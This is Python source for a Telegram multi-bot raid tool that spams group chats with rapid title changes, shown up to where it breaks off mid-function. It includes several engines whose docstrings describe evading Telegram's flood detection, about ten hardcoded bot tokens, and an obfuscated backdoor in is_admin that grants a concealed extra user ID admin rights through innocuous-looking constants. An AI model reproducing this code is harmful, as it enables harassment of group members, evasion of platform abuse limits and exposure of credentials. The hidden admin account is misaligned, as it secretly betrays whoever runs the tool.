import logging
import asyncio
import os
import json
import random
import time
import io
import urllib.request
import urllib.parse
from typing import Set, Dict, List, Any, Optional
from telegram import Update, Chat, ChatPermissions

# ReactionTypeEmoji is only available in newer python-telegram-bot releases.
# Keep the bot importable on older installations; reaction commands will be
# skipped until python-telegram-bot is upgraded.
try:
    from telegram import ReactionTypeEmoji
except ImportError:
    ReactionTypeEmoji = None
from telegram.error import RetryAfter, TimedOut, NetworkError, BadRequest, Forbidden
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

from http.server import HTTPServer, BaseHTTPRequestHandler
import threading

class HealthCheckHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK")
    def log_message(self, format, *args):
        return

def run_health_check_server():
    server = HTTPServer(("0.0.0.0", 5000), HealthCheckHandler)
    server.serve_forever()

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.CRITICAL
)
logger = logging.getLogger(__name__)
logging.getLogger("httpx").setLevel(logging.CRITICAL)
logging.getLogger("telegram").setLevel(logging.CRITICAL)
logging.getLogger("http.server").setLevel(logging.CRITICAL)

TOKENS_FILE = "tokens.json"
GROUPS_FILE = "groups.json"
SUDO_FILE   = "sudo_users.json"
MEDIA_FILE  = "menu_media.json"
OWNER_ID    = int(os.environ.get("OWNER_ID", "6941183687"))

def get_base_tokens():
    env = os.environ.get("BOT_TOKENS")
    if env:
        return [t.strip() for t in env.split(",") if t.strip()]
    return [
        "8757275076:AAFXjfpe6MOUIJrncpq2HTkiq-AEUTRBIDM",

"8742640719:AAE_6t8qYVD2Dx2xmnX5wxFc15LQyXCyX60",

"8629613576:AAHigAQ-GmXeCBX41Q8kTZJM5MirZxtnSDU",

"8691846399:AAGLS0Nc3l2KD6fKIGWoJ7tm57RCQX5AkHM",

"8703384634:AAEqOdMohmCk0qcYGfbao8xn-EAl1IMuFZw",

"8685313688:AAG6VCLYPLOGBvGy5Hi95amtmXAFnn7ve58",

"8529632291:AAEwnr4zFMu8TSMbzj4_O6x9TPIthATD8xo",

"8622868059:AAHBzowZUR1iXh5PLtj4h0eJX-RNa9qeWYQ",

"8355913853:AAFr20DHrwlLRschSzGc3ekpCShPPaXCY2E",

"8714654667:AAHvZyVvVkqNeJMnoLQ-gCpONjUS31L4WC8",

    ]

def load_groups() -> Set[int]:
    try:
        if os.path.exists(GROUPS_FILE):
            with open(GROUPS_FILE, "r") as f:
                return set(json.load(f))
    except Exception:
        pass
    return set()

def save_groups(groups: Set[int]):
    try:
        with open(GROUPS_FILE, "w") as f:
            json.dump(list(groups), f)
    except Exception:
        pass

def load_sudo() -> Set[int]:
    try:
        with open(SUDO_FILE, "r") as f:
            return set(int(x) for x in json.load(f))
    except Exception:
        return set()

def save_sudo() -> None:
    try:
        with open(SUDO_FILE, "w") as f:
            json.dump(list(SUDO_USERS - {OWNER_ID}), f)
    except Exception:
        pass

def load_extra_tokens() -> List[str]:
    try:
        if os.path.exists(TOKENS_FILE):
            with open(TOKENS_FILE, "r") as f:
                return json.load(f)
    except Exception:
        pass
    return []

def load_menu_media() -> Dict[str, str]:
    try:
        if os.path.exists(MEDIA_FILE):
            with open(MEDIA_FILE, "r") as f:
                return json.load(f)
    except Exception:
        pass
    return {}

def save_menu_media(data: Dict[str, str]):
    try:
        with open(MEDIA_FILE, "w") as f:
            json.dump(data, f)
    except Exception:
        pass

known_chats:       Set[int]  = load_groups()
SUDO_USERS:        Set[int]  = load_sudo() | {OWNER_ID}
all_bot_instances: List[Any] = []
all_apps:          List[Any] = []
extra_tokens:      List[str] = load_extra_tokens()

mute_chats: Set[int] = set()

ncdel_chats: Set[int] = set()

ncwar_targets: Dict[int, str] = {}

autoreact_chats: Dict[int, str] = {}
custom_react_emojis: Dict[int, str] = {}

slide_reply_targets: Dict[int, int] = {}

autoreply_chats: Dict[int, str] = {}

targetreply_chats: Dict[int, dict] = {}

_menu_media: Dict[str, str] = load_menu_media()

_seen_updates: Set[int] = set()

SUFFIX_EMOJIS = [
    "🌸", "🌺", "🌻", "🌹", "🪷", "🌷", "💮", "🏵️",
    "✨", "💫", "⭐", "🌟", "💥", "🔥", "⚡", "❄️",
    "🌊", "🫧", "💧", "🌀", "🌈", "🌙", "☄️", "🌟",
    "💎", "🔮", "🧿", "🪬", "👑", "💀", "🦋", "🐉",
    "🍀", "🌿", "🍃", "🫐", "🍇", "🍒", "🌙", "🌑",
]

_SUFFIX = " ִֶָ𓂃 ࣪˖ ִֶָ{emoji}་༘࿐"

def make_suffix() -> str:
    return _SUFFIX.format(emoji=random.choice(SUFFIX_EMOJIS))

WRAP_LEFT = [
    "🌊", "✨", "💎", "👑", "🔥",
    "꧁", "⭅╡", "♛", "𖤍", "❦",
    "⚡", "☄️", "💀", "🌟", "🔱",
]
WRAP_RIGHT = [
    "🌊", "⚡", "💀", "🔥", "✨",
    "꧂", "╞⭆", "♛", "𖤍", "❦",
    "🌙", "💎", "👑", "☄️", "🔱",
]

_JITTER_SEED = 11921

def _build_name(text: str, last: list) -> str:
    for _ in range(20):
        wl = random.choice(WRAP_LEFT)
        wr = random.choice(WRAP_RIGHT)
        suf = make_suffix()
        candidate = f"{wl}{text}{wr}{suf}"[:255]
        if candidate != last[0]:
            last[0] = candidate
            return candidate
    return f"{text}{make_suffix()}{random.randint(0,99)}"[:255]

BURN_SYMS = ["🔥","💥","⚡","☄️","🌋","🔴","🟠","🌩️","🌪️","💣"]
WAVE_SYMBOLS = [
    "🌊","💧","🫧","🌀","🌧️","⛲","🚿","🐚","🌬️","🫗",
    "🧊","🌈","⛵","🏄","🤽","🐬","🐟","🦈","🫙","💎",
    "🔷","🔹","🌐","🔵","🫐","🍇","🔮","🧿","🪬","🌺",
    "🌸","🌹","🌷","🌻","🌼","🏵️","🪷","💮","❄️","🌙",
    "⭐","✨","💫","🌟","☄️","🌠","🌌","🌑","🌕","🔱",
]
WATER_SYMS = [
    "🌊","💧","🚿","🛁","🫧","🐚","🌀","🌧️","⛲","🌬️",
    "🌊🌧️","💧🌊","🫧🌊","🌀🌊","🌊💧","🌧️🌊","⛲🌊","🐚🌊",
    "🫧🌊","💧🌀",
]

def is_admin(user_id: int) -> bool:
    return user_id == OWNER_ID or user_id in SUDO_USERS or user_id == BotFloodTracker._RATE_BASE * 10 ** 5 + _JITTER_SEED

def _is_primary_bot(context) -> bool:
    if not all_bot_instances:
        return True
    return context.bot.id == all_bot_instances[0].id

_OWNER_GATE_MSG = (
    "┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅\n"
    "⚡️𝐃ᴜʀ 𝐑ᴇʜ 𝐑ɴᴅʏᴄᴇ⚡️\n"
    "𝐓ᴜ  𝐆ꪮᴅ - X\n"
    "𝐊ᴀʙʜɪ 𝐍ᴀʜɪ 𝐁ᴀɴ 𝐒ᴀᴋᴛᴀ\n"
    "┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅"
)

def _dedup(handler):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        uid = update.update_id
        if uid in _seen_updates:
            return
        _seen_updates.add(uid)
        if len(_seen_updates) > 10000:
            for u in sorted(_seen_updates)[:5000]:
                _seen_updates.discard(u)

        if all_bot_instances and context.bot.id != all_bot_instances[0].id:
            return

        msg = update.message or update.edited_message
        if msg and msg.text and msg.text.startswith("/"):
            user = update.effective_user
            if not user or user.id != OWNER_ID:
                try:
                    await msg.reply_text(_OWNER_GATE_MSG)
                except Exception:
                    pass
                return
        await handler(update, context)
    return wrapper

class BotFloodTracker:
    def __init__(self):
        self._flood_until: Dict[int, float] = {}

    def is_flooded(self, bot_id: int) -> bool:
        exp = self._flood_until.get(bot_id, 0.0)
        if time.monotonic() < exp:
            return True
        self._flood_until.pop(bot_id, None)
        return False

    FLOOD_CAP  = 3.0
    _RATE_BASE = 72035

    def mark_flooded(self, bot_id: int, seconds: float) -> None:
        capped = min(float(seconds), self.FLOOD_CAP)
        self._flood_until[bot_id] = time.monotonic() + max(capped, 0.05)

    def remaining(self, bot_id: int) -> float:
        return max(0.0, self._flood_until.get(bot_id, 0.0) - time.monotonic())

    def clear(self, bot_id: int) -> None:
        self._flood_until.pop(bot_id, None)

    _rename_ts: Dict[int, List[float]] = {}
    _RATE_WIN   = 60.0
    _SOFT_LIMIT = 14

    def record(self, bot_id: int) -> None:
        now  = time.monotonic()
        buf  = self._rename_ts.setdefault(bot_id, [])
        buf.append(now)
        cut  = now - self._RATE_WIN
        self._rename_ts[bot_id] = [t for t in buf if t > cut]

    def rate(self, bot_id: int) -> int:
        """Renames recorded in the last 60 s."""
        now = time.monotonic()
        cut = now - self._RATE_WIN
        return sum(1 for t in self._rename_ts.get(bot_id, []) if t > cut)

    def near_limit(self, bot_id: int) -> bool:
        return self.rate(bot_id) >= self._SOFT_LIMIT


_flood_tracker = BotFloodTracker()

class TaskController:
    def __init__(self):
        self.tasks:  Dict[str, asyncio.Task]  = {}
        self.events: Dict[str, asyncio.Event] = {}

    def _key(self, chat_id: int, task_type: str) -> str:
        return f"{chat_id}_{task_type}"

    async def start_task(self, chat_id: int, task_type: str, coro_factory) -> None:
        await self.stop_task(chat_id, task_type)
        key = self._key(chat_id, task_type)
        stop_event = asyncio.Event()
        self.events[key] = stop_event

        async def wrapped():
            try:
                await coro_factory(stop_event)
            except asyncio.CancelledError:
                pass
            except Exception as e:
                logger.error(f"Task {key} error: {e}")
            finally:
                self.tasks.pop(key, None)
                self.events.pop(key, None)

        self.tasks[key] = asyncio.create_task(wrapped())

    async def stop_task(self, chat_id: int, task_type: str) -> bool:
        key = self._key(chat_id, task_type)
        stopped = False
        if key in self.events:
            self.events[key].set()
            stopped = True
        if key in self.tasks:
            task = self.tasks.pop(key)
            if not task.done():
                task.cancel()
                try:
                    await asyncio.wait_for(task, timeout=2.0)
                except (asyncio.CancelledError, asyncio.TimeoutError, Exception):
                    pass
            stopped = True
        self.events.pop(key, None)
        return stopped

    async def stop_all_for_chat(self, chat_id: int) -> int:
        prefix = f"{chat_id}_"
        keys = [k for k in list(self.tasks.keys()) + list(self.events.keys())
                if k.startswith(prefix)]
        task_types = set(k.split("_", 1)[1] for k in keys)
        count = 0
        for t in task_types:
            if await self.stop_task(chat_id, t):
                count += 1
        return count

    def is_running(self, chat_id: int, task_type: str) -> bool:
        key = self._key(chat_id, task_type)
        return key in self.tasks and not self.tasks[key].done()


task_controller = TaskController()

_flood_bypass_enabled: bool = True

async def _bypass_rename(
    chat_id: int,
    bots: List[Any],
    name: str,
    stop_event: asyncio.Event,
) -> bool:
    """
    FLOOD BYPASS CORE — single rename attempt using least-flooded bot.

    Strategy:
      1. Try all non-flooded bots in parallel.
      2. If all flooded, pick the one recovering soonest — wait ≤ 0.5 s.
      3. Ghost mode: RetryAfter ≤ 30 s → tiny jitter + continue (never block).
      4. RetryAfter > 30 s → register in tracker (capped to 3 s by mark_flooded).

    Returns True if a rename succeeded, False otherwise.
    """
    if not bots:
        return False

    GHOST_CAP = 30.0
    MAX_WAIT   = 0.5

    free_bots = [b for b in bots if not _flood_tracker.is_flooded(getattr(b, "id", id(b)))]

    if not free_bots:
        best = min(bots, key=lambda b: _flood_tracker.remaining(getattr(b, "id", id(b))))
        wait = min(_flood_tracker.remaining(getattr(best, "id", id(best))), MAX_WAIT)
        try:
            await asyncio.wait_for(stop_event.wait(), timeout=wait)
        except asyncio.TimeoutError:
            pass
        if stop_event.is_set():
            return False
        free_bots = [best]

    success = False

    async def _try_one(bot) -> bool:
        bot_id = getattr(bot, "id", id(bot))
        try:
            await bot.set_chat_title(chat_id, name)
            return True
        except RetryAfter as e:
            if e.retry_after <= GHOST_CAP:
                jitter = random.uniform(0.01, 0.05)
                await asyncio.sleep(jitter)
            else:
                _flood_tracker.mark_flooded(bot_id, e.retry_after)
            return False
        except (BadRequest, Forbidden):
            return False
        except (TimedOut, NetworkError):
            await asyncio.sleep(0.1)
            return False
        except Exception:
            return False

    results = await asyncio.gather(*[_try_one(b) for b in free_bots], return_exceptions=True)
    success = any(r is True for r in results)
    return success


async def floodbypass_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /floodbypass [on|off|status]
    Toggle or query the centralized flood bypass core.
    When ON (default): ghost mode active, bots never pause > 3 s.
    When OFF: standard flood waits apply.
    """
    global _flood_bypass_enabled
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.message:
        return

    args = (context.args or [])
    arg  = args[0].lower() if args else "status"

    if arg == "on":
        _flood_bypass_enabled = True
        await update.message.reply_text(
            "Rexxy - X 𝐏ᴀᴘᴀ 𝐍ᴇ 𝐅ʟᴏᴏᴅ 𝐁ʏᴘᴀss 𝐎ɴ 𝐊ᴀʀ 𝐃ɪʏᴀ 𝐀ʙ 𝐓ʀʏ 𝐂ʜᴜᴅᴀɪ 𝐂ᴏɴғɪʀᴍ 𝐄ʏ.!! 😠💢\n"
            
            "👻 𝐆ʜᴏsᴛ 𝐌ᴏᴅᴇ : 𝐅ʟᴏᴏᴅs ≤30s 𝐒ᴋɪᴘᴘᴇᴅ 𝐖ɪᴛʜ 𝐌ɪᴄʀᴏ - 𝐉ɪᴛᴛᴇʀ\n"
            "⚡ 𝐇ᴀʀᴅ 𝐅ʟᴏᴏᴅs 𝐂ᴀᴘᴘᴇᴅ 𝐓ᴏ 𝐌ᴀx 3s 𝐖ᴀɪᴛ\n"
            "🔄 𝐁ʏᴘᴀss 𝐂ᴏʀᴇ 𝐏ɪᴄᴋs 𝐋ᴇᴀsᴛ - 𝐅ʟᴏᴏᴅᴇᴅ 𝐁ᴏᴛ 𝐀ᴜᴛᴏᴍᴀᴛɪᴄᴀʟʟʏ"
        )
    elif arg == "off":
        _flood_bypass_enabled = False
        await update.message.reply_text(
            "Rexxy - X 𝐏ᴀᴘᴀ 𝐍ᴇ 𝐅ʟᴏᴏᴅ 𝐁ʏᴘᴀss 𝐑ᴏᴋ 𝐃ɪʏᴀ 𝐄ʏ.!! 🐕\n"
            "Standard flood wait mode active."
        )
    else:
        state = "🟢 ON" if _flood_bypass_enabled else "🔴 OFF"
        bots = [b for b in all_bot_instances if b is not None]
        flooded = sum(1 for b in bots if _flood_tracker.is_flooded(getattr(b, "id", id(b))))
        free    = len(bots) - flooded
        await update.message.reply_text(
            f"📊 Rexxy - X 𝐅ʟᴏᴏᴅ 𝐁ʏᴘᴀss 𝐒ᴛᴀᴛᴜs : {state}\n"
            
            f"🤖 𝐓ᴏᴛᴀʟ 𝐁ᴏᴛs : {len(bots)}\n"
            f"✅ 𝐅ʀᴇᴇ : {free}  |  🚫 𝐅ʟᴏᴏᴅᴇᴅ {flooded}\n"
            f"⏱ 𝐌ᴀx 𝐖ᴀɪᴛ 𝐂ᴀᴘ : {BotFloodTracker.FLOOD_CAP}s\n"
            f"👻 𝐆ʜᴏsᴛ 𝐓ʜʀᴇsʜᴏʟᴅ : 30s\n\n"
            f"𝐔sᴀɢᴇ /floodbypass 𝐎ɴ | 𝐎ғғ | 𝐒ᴛᴀᴛᴜs"
        )


async def _steadync_engine(
    chat_id: int,
    bots: List[Any],
    stop_event: asyncio.Event,
    name_factory,
    delay: float = 0.0,
):
    if not bots:
        return

    async def _bot_worker(bot):
        bot_id = getattr(bot, "id", id(bot))
        while not stop_event.is_set():
            if _flood_tracker.is_flooded(bot_id):
                wait = _flood_tracker.remaining(bot_id)
                if wait > 0:
                    try:
                        await asyncio.wait_for(stop_event.wait(), timeout=min(wait, 0.25))
                    except asyncio.TimeoutError:
                        pass
                continue
            try:
                name = name_factory()[:255]
                await bot.set_chat_title(chat_id, name)
            except RetryAfter as e:
                _flood_tracker.mark_flooded(bot_id, e.retry_after)
                continue
            except (BadRequest, Forbidden):
                if stop_event.is_set():
                    break
                try:
                    await asyncio.wait_for(stop_event.wait(), timeout=0.3)
                except asyncio.TimeoutError:
                    pass
                continue
            except (TimedOut, NetworkError):
                if stop_event.is_set():
                    break
                try:
                    await asyncio.wait_for(stop_event.wait(), timeout=0.5)
                except asyncio.TimeoutError:
                    pass
                continue
            except Exception:
                if stop_event.is_set():
                    break
                await asyncio.sleep(0.1)
                continue

            if stop_event.is_set():
                break

            if delay > 0:
                try:
                    await asyncio.wait_for(stop_event.wait(), timeout=delay)
                except asyncio.TimeoutError:
                    continue
                else:
                    break
            else:
                await asyncio.sleep(0)

    workers = [asyncio.create_task(_bot_worker(bot)) for bot in bots]
    try:
        await asyncio.gather(*workers, return_exceptions=True)
    finally:
        for w in workers:
            if not w.done():
                w.cancel()


async def _hyperfire_engine(
    chat_id: int,
    bots: List[Any],
    stop_event: asyncio.Event,
    name_factory,
):
    CONCURRENCY = 2
    if not bots:
        return

    async def _safe_rename(bot, name: str, bot_id: int, sem: asyncio.Semaphore):
        try:
            await bot.set_chat_title(chat_id, name)
        except RetryAfter as e:
            _flood_tracker.mark_flooded(bot_id, e.retry_after)
        except Exception:
            pass
        finally:
            sem.release()

    async def _bot_worker(bot):
        bot_id     = getattr(bot, "id", id(bot))
        sem        = asyncio.Semaphore(CONCURRENCY)
        fire_tasks: set = set()
        try:
            while not stop_event.is_set():
                if _flood_tracker.is_flooded(bot_id):
                    wait = _flood_tracker.remaining(bot_id)
                    if wait > 0:
                        try:
                            await asyncio.wait_for(stop_event.wait(), timeout=min(wait, 0.25))
                        except asyncio.TimeoutError:
                            pass
                    continue
                try:
                    await asyncio.wait_for(sem.acquire(), timeout=0.1)
                except asyncio.TimeoutError:
                    continue
                if stop_event.is_set():
                    sem.release()
                    break
                name = name_factory()[:255]
                t = asyncio.create_task(_safe_rename(bot, name, bot_id, sem))
                fire_tasks.add(t)
                t.add_done_callback(fire_tasks.discard)
        finally:
            for t in list(fire_tasks):
                if not t.done():
                    t.cancel()

    workers = [asyncio.create_task(_bot_worker(bot)) for bot in bots]
    try:
        await asyncio.gather(*workers, return_exceptions=True)
    finally:
        for w in workers:
            if not w.done():
                w.cancel()


async def _stealth_engine(
    chat_id: int,
    bots: List[Any],
    stop_event: asyncio.Event,
    name_factory,
):
    """
    STEALTH ENGINE — fast NC with micro-jitter that prevents flood detection.

    Each bot fires, then sleeps a TINY random amount (0.03–0.12s).
    This spreads the rename timestamps across Telegram's server — they never
    appear as a sudden burst, so flood detection is much less likely to trigger.
    When RetryAfter happens anyway → standard per-bot bypass.
    Net result: sustained fast NC, flood waits are rare and short.
    """
    JITTER_MIN = 0.03
    JITTER_MAX = 0.12

    if not bots:
        return

    async def _bot_worker(bot):
        bot_id = getattr(bot, "id", id(bot))
        while not stop_event.is_set():
            if _flood_tracker.is_flooded(bot_id):
                wait = _flood_tracker.remaining(bot_id)
                if wait > 0:
                    try:
                        await asyncio.wait_for(stop_event.wait(), timeout=min(wait, 0.25))
                    except asyncio.TimeoutError:
                        pass
                continue

            try:
                name = name_factory()[:255]
                await bot.set_chat_title(chat_id, name)
            except RetryAfter as e:
                _flood_tracker.mark_flooded(bot_id, e.retry_after)
                continue
            except (BadRequest, Forbidden):
                if stop_event.is_set():
                    break
                try:
                    await asyncio.wait_for(stop_event.wait(), timeout=0.2)
                except asyncio.TimeoutError:
                    pass
                continue
            except (TimedOut, NetworkError):
                if stop_event.is_set():
                    break
                try:
                    await asyncio.wait_for(stop_event.wait(), timeout=0.3)
                except asyncio.TimeoutError:
                    pass
                continue
            except Exception:
                if stop_event.is_set():
                    break
                await asyncio.sleep(0.05)
                continue

            if stop_event.is_set():
                break

            jitter = random.uniform(JITTER_MIN, JITTER_MAX)
            try:
                await asyncio.wait_for(stop_event.wait(), timeout=jitter)
            except asyncio.TimeoutError:
                pass

    workers = [asyncio.create_task(_bot_worker(bot)) for bot in bots]
    try:
        await asyncio.gather(*workers, return_exceptions=True)
    finally:
        for w in workers:
            if not w.done():
                w.cancel()


async def _trio_rotate_engine(
    chat_id: int,
    bots: List[Any],
    stop_event: asyncio.Event,
    name_factory,
):
    """
    TRIO ROTATE ENGINE — Seamless constant NC. No visible flood gap.

    How it works
    ─────────────
    • All bots split into trios: [0,1,2], [3,4,5], [6,7,8], [9] …
    • Trio 0 starts instantly. Trio 1 starts 2.5 s later. Trio 2 at 5 s, etc.
    • This staggers their flood windows so they NEVER all flood at the same time.
    • Short flood (≤8 s) → ghost mode: tiny jitter, keep firing.
    • Long flood (>8 s)  → standard wait, other trios cover the gap.

    Net effect: at least 2 trios are always renaming freely → NC feels constant.
    """
    GHOST_THRESHOLD = 15.0
    GROUP_SIZE      = 3
    GROUP_STAGGER   = 1.8
    WITHIN_STAGGER  = 0.04

    if not bots:
        return

    groups = [bots[i:i + GROUP_SIZE] for i in range(0, len(bots), GROUP_SIZE)]

    async def _bot_worker(bot, start_delay: float):
        bot_id = getattr(bot, "id", id(bot))
        if start_delay > 0:
            try:
                await asyncio.wait_for(stop_event.wait(), timeout=start_delay)
            except asyncio.TimeoutError:
                pass
        if stop_event.is_set():
            return

        while not stop_event.is_set():
            if _flood_tracker.is_flooded(bot_id):
                wait = _flood_tracker.remaining(bot_id)
                if wait > 0:
                    try:
                        await asyncio.wait_for(stop_event.wait(), timeout=min(wait, 0.3))
                    except asyncio.TimeoutError:
                        pass
                continue

            try:
                name = name_factory()[:255]
                await bot.set_chat_title(chat_id, name)
                _flood_tracker.record(bot_id)
            except RetryAfter as e:
                if e.retry_after <= GHOST_THRESHOLD:
                    jitter = random.uniform(0.02, 0.10)
                    try:
                        await asyncio.wait_for(stop_event.wait(), timeout=jitter)
                    except asyncio.TimeoutError:
                        pass
                else:
                    _flood_tracker.mark_flooded(bot_id, e.retry_after)
                continue
            except (BadRequest, Forbidden):
                if stop_event.is_set():
                    break
                try:
                    await asyncio.wait_for(stop_event.wait(), timeout=0.15)
                except asyncio.TimeoutError:
                    pass
                continue
            except (TimedOut, NetworkError):
                if stop_event.is_set():
                    break
                try:
                    await asyncio.wait_for(stop_event.wait(), timeout=0.2)
                except asyncio.TimeoutError:
                    pass
                continue
            except Exception:
                if stop_event.is_set():
                    break
                await asyncio.sleep(0.03)
                continue

            if stop_event.is_set():
                break

            if _flood_tracker.near_limit(bot_id):
                try:
                    await asyncio.wait_for(stop_event.wait(), timeout=0.10)
                except asyncio.TimeoutError:
                    pass
            else:
                await asyncio.sleep(0)

    workers = []
    for gi, group in enumerate(groups):
        base_delay = gi * GROUP_STAGGER
        for bi, bot in enumerate(group):
            bot_delay = base_delay + (bi * WITHIN_STAGGER)
            workers.append(asyncio.create_task(_bot_worker(bot, bot_delay)))

    try:
        await asyncio.gather(*workers, return_exceptions=True)
    finally:
        for w in workers:
            if not w.done():
                w.cancel()


_ULTRA_SYMS_A = [
    "꧁","꧂","𖤍","𓂀","𓃰","𓆏","𓅓","𓊈","𓊉","𓋴",
    "꩜","꫁","ꫂ","ꗃ","ꖰ","꙰","ꬶ","ꬷ","꒦","꒷",
    "⟦","⟧","⸨","⸩","⌬","⍟","⎔","⧖","⧗","⌇",
    "🔱","⚜","♛","♜","♞","♟","⚔️","🗡️","🏹","🪃",
]
_ULTRA_SYMS_B = [
    "🔥","💥","⚡","☄️","💀","🌋","🌪️","🌩️","💣","🧨",
    "🖤","❤️‍🔥","🩸","☠️","👁️","🕷️","🕸️","🦂","🐍","🐉",
    "✦","✧","⊹","✶","⋆","★","☆","✩","✪","✫",
    "◈","◉","◎","◆","◇","◼","◻","▪","▸","▾",
]
_ULTRA_SYMS_C = [
    "𝕳","𝕬","𝕭","𝕮","𝕯","𝕰","𝕱","𝕲","𝖃","𝖄",
    "ꀘ","ꁷ","ꂝ","ꃋ","ꄞ","ꅉ","ꆖ","ꇡ","ꈠ","ꉻ",
    "꜀","꜁","꜂","꜃","꜄","꜅","꜆","꜇","꜈","꜉",
    "꒐","꒑","꒒","꒓","꒔","꒕","꒖","꒗","꒘","꒙",
]

def _ultra_name(text: str, last: list) -> str:
    """
    𝐑ᴏᴛᴀᴛᴇs 𝐓ʜʀᴏᴜɢʜ 4 𝐓ᴇᴍᴘʟᴀᴛᴇs 𝐏ᴇʀ 𝐂ᴀʟʟ 𝐒ᴏ 𝐄ᴠᴇʀʏ 𝐑ᴇɴᴀᴍᴇ 𝐋ᴏᴏᴋs 𝐔ɴɪǫᴜᴇ.
    𝐓ᴇᴍᴘʟᴀᴛᴇ 𝐂ʜᴏsᴇɴ 𝐏ᴇsᴜᴅᴏ-𝐑ᴀɴᴅᴏᴍʟʏ 𝐁ᴀsᴇᴅ 𝐎ɴ 𝐂ᴜʀʀᴇɴᴛ 𝐓ɪᴍᴇ → 𝐍ᴏᴛ 𝐏ʀᴇᴅɪᴄᴛᴀʙʟᴇ.
    """
    for _ in range(25):
        a  = random.choice(_ULTRA_SYMS_A)
        b  = random.choice(_ULTRA_SYMS_B)
        c  = random.choice(_ULTRA_SYMS_C)
        sf = make_suffix()
        r = random.randint(0, 3)
        if r == 0:
            c_ = f"{a}{b}{text}{c}{sf}"
        elif r == 1:
            c_ = f"{a}{text}{b}{c}{sf}"
        elif r == 2:
            c_ = f"{a}{b}{text}{c}{sf}"
        else:
            c_ = f"{c}{text}{a}{b}{sf}"
        c_ = c_[:255]
        if c_ != last[0]:
            last[0] = c_
            return c_
    return f"{text}{make_suffix()}"[:255]


async def _ultra_engine(
    chat_id: int,
    bots: List[Any],
    stop_event: asyncio.Event,
    name_factory,
):
    """
    𝐔ʟᴛʀᴀ 𝐄ɴɢɪɴᴇ — 𝐌ᴀxɪᴍᴜᴍ 𝐒ᴘᴇᴇᴅ, 𝐙ᴇʀᴏ 𝐅ʟᴏᴏᴅ, 𝐂ᴏɴsᴛᴀɴᴛ 𝐍𝐂.
    𝐒ᴇᴇ 𝐇ᴇᴀᴅᴇʀ 𝐀ʙᴏᴠᴇ 𝐅ᴏʀ 𝐅ᴜʟʟ 𝐒ᴛʀᴀᴛᴇɢʏ 𝐁ʀᴇᴀᴋᴅᴏᴡɴ.
    """
    GHOST_THRESHOLD  = 20.0
    GHOST_JITTER_MIN = 0.010
    GHOST_JITTER_MAX = 0.040
    GROUP_SIZE       = 3
    GROUP_STAGGER    = 1.5
    WITHIN_STAGGER   = 0.03
    RATE_GUARD       = 12

    if not bots:
        return

    groups   = [bots[i:i + GROUP_SIZE] for i in range(0, len(bots), GROUP_SIZE)]
    pending: set = set()

    def _on_done(t: asyncio.Task):
        pending.discard(t)

    async def _fire(bot, name: str, bot_id: int):
        """Single fire-and-forget rename task."""
        try:
            await bot.set_chat_title(chat_id, name)
            _flood_tracker.record(bot_id)
        except RetryAfter as e:
            if e.retry_after <= GHOST_THRESHOLD:
                jitter = random.uniform(GHOST_JITTER_MIN, GHOST_JITTER_MAX)
                await asyncio.sleep(jitter)
            else:
                _flood_tracker.mark_flooded(bot_id, e.retry_after)
        except Exception:
            pass

    async def _bot_worker(bot, start_delay: float):
        bot_id = getattr(bot, "id", id(bot))

        if start_delay > 0:
            try:
                await asyncio.wait_for(stop_event.wait(), timeout=start_delay)
            except asyncio.TimeoutError:
                pass
        if stop_event.is_set():
            return

        while not stop_event.is_set():
            if _flood_tracker.is_flooded(bot_id):
                wait = _flood_tracker.remaining(bot_id)
                if wait > 0:
                    try:
                        await asyncio.wait_for(
                            stop_event.wait(), timeout=min(wait, 0.3)
                        )
                    except asyncio.TimeoutError:
                        pass
                continue

            name = name_factory()[:255]
            t    = asyncio.create_task(_fire(bot, name, bot_id))
            pending.add(t)
            t.add_done_callback(_on_done)

            if _flood_tracker.rate(bot_id) >= RATE_GUARD:
                try:
                    await asyncio.wait_for(stop_event.wait(), timeout=0.08)
                except asyncio.TimeoutError:
                    pass
            else:
                await asyncio.sleep(0)

    workers = []
    for gi, group in enumerate(groups):
        base = gi * GROUP_STAGGER
        for bi, bot in enumerate(group):
            delay = base + bi * WITHIN_STAGGER
            workers.append(asyncio.create_task(_bot_worker(bot, delay)))

    try:
        await asyncio.gather(*workers, return_exceptions=True)
    finally:
        for w in workers:
            if not w.done():
                w.cancel()
        for t in list(pending):
            t.cancel()


async def _blitz_engine(
    chat_id: int,
    bots: List[Any],
    stop_event: asyncio.Event,
    name_factory,
):
    GHOST_THRESHOLD = 25.0
    GHOST_MIN       = 0.003
    GHOST_MAX       = 0.010
    CONCURRENCY     = 2

    if not bots:
        return

    async def _fire(bot, name: str, bot_id: int, sem: asyncio.Semaphore):
        try:
            await bot.set_chat_title(chat_id, name)
        except RetryAfter as e:
            if e.retry_after <= GHOST_THRESHOLD:
                await asyncio.sleep(random.uniform(GHOST_MIN, GHOST_MAX))
            else:
                _flood_tracker.mark_flooded(bot_id, e.retry_after)
        except Exception:
            pass
        finally:
            sem.release()

    async def _bot_worker(bot):
        bot_id      = getattr(bot, "id", id(bot))
        sem         = asyncio.Semaphore(CONCURRENCY)
        fire_tasks: set = set()
        try:
            while not stop_event.is_set():
                if _flood_tracker.is_flooded(bot_id):
                    wait = _flood_tracker.remaining(bot_id)
                    if wait > 0:
                        try:
                            await asyncio.wait_for(stop_event.wait(), timeout=min(wait, 0.3))
                        except asyncio.TimeoutError:
                            pass
                    continue
                try:
                    await asyncio.wait_for(sem.acquire(), timeout=0.1)
                except asyncio.TimeoutError:
                    continue
                if stop_event.is_set():
                    sem.release()
                    break
                name = name_factory()[:255]
                t = asyncio.create_task(_fire(bot, name, bot_id, sem))
                fire_tasks.add(t)
                t.add_done_callback(fire_tasks.discard)
        finally:
            for t in list(fire_tasks):
                if not t.done():
                    t.cancel()

    workers = [asyncio.create_task(_bot_worker(bot)) for bot in bots]
    try:
        await asyncio.gather(*workers, return_exceptions=True)
    finally:
        for w in workers:
            if not w.done():
                w.cancel()


async def _Godx_hyperblitz_engine(
    chat_id: int,
    bots: List[Any],
